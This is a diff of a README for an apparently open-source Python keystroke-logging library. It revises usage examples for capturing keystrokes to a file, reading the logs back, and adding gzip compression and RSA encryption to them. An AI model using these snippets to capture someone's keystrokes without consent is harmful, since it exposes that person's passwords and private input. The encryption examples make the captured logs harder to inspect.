@@ -71,11 +71,9 @@ from mrrobot.catcher import Catcher
 from mrrobot.logger import FileLogger
 
 
-# A file logger that writes to 'output.txt' every 8 characters.
-# Obviously, you may want to increase the buffer size.
-# With a very large buffer size, you can also use compress=True and a .gz filename.
-l = FileLogger(filename="output.txt",
-               buffer_size=8)
+# A file logger that writes to 'output.txt' every 32 key strokes (default buffer_size).
+# If your filename ends in '.gz', e.g. 'output.txt.gz', it will be compressed using gzip.
+l = FileLogger(filename="output.txt")
 
 # Get our platform's keys catcher, and connect it to our logger.
 c = Catcher(logger=l)
@@ -117,8 +115,8 @@ You can read a log written using `FileLogger` or `CompressedFileLogger` with the
 from mrrobot.reader import get_log_entries
 
 
+# If your file name ends in '.gz', it will be decompressed on-the-fly.
 for entry in get_log_entries("output.txt"):
-# for entry in get_log_entries("output.txt.gz"):
 
     print("Time=%s, Character='%s'" % (entry.timestamp,
                                        entry.character))
@@ -126,39 +124,54 @@ for entry in get_log_entries("output.txt"):
 
 ## Encryption
 
-You can use an pair of RSA keys, either in OpenSSH (`id_rsa`, `id_rsa.pub`) or
-OpenSSL format (`.pem` files), to encrypt your logs.
+You can use an pair of RSA keys, either in OpenSSH (id_rsa, id_rsa.pub) or
+OpenSSL format (.pem files), to encrypt your logs.
 
-To generate a pair of RSA keys on Linux:
+### Generate a RSA keypair
+
+To generate a pair of RSA keys on Linux or OS X:
+
 ```bash
 $ ssh-keygen -t rsa
 ```
 
-Then you can start an encrypted key logger, e.g.:
+
+### Write example
 
 ```python
-from mrrobot.catcher import Catcher
-from mrrobot.logger import EncryptedFileLogger
-
-
-l = EncryptedFileLogger(filename="output.txt",
-                        public_key_file="~/.ssh/id_rsa.pub")
-
-c = Catcher(logger=l)
-c.run()
+l = FileLogger(filename="output.txt",
+               public_key_file="~/.ssh/id_rsa.pub")
 ```
 
-And read the log, e.g.:
+
+### Read example
 
 ```python
-from mrrobot.reader import get_log_entries
-
-
 for entry in get_log_entries("output.txt",
                              private_key_file="~/.ssh/id_rsa"):
     print(entry)
 ```
 
+
+## Compression
+
+When using a `FileLogger`, if the filename ends in `.gz`, it will automatically
+be compressed using Gzip. Similarly, `get_log_entries` will decompress the file
+on-the-fly.
+
+### Write example
+```
+l = FileLogger(filename="output.txt.gz")
+```
+
+### Read example
+```python
+for entry in get_log_entries("output.txt.gz"):
+    print(entry)
+```
+
+You can also combine compression and encryption -- as the RSA encryption will
+significantly increase disk usage.
 
 
 # License
